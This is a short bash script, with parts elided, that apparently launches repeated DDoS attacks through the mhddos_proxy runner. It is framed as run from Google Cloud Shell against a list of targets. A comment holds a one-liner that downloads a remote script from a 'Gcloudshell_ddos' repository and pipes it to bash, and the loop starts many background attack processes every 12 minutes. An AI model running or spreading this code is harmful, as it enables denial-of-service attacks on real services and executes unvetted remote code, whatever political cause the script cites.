#!/bin/bash
#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L4_noLog.sh | bash
...
do
   ...
   for (( i=1; i<=list_size; i++ ))
      do
            ...
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc&
      done
sleep 12m
done
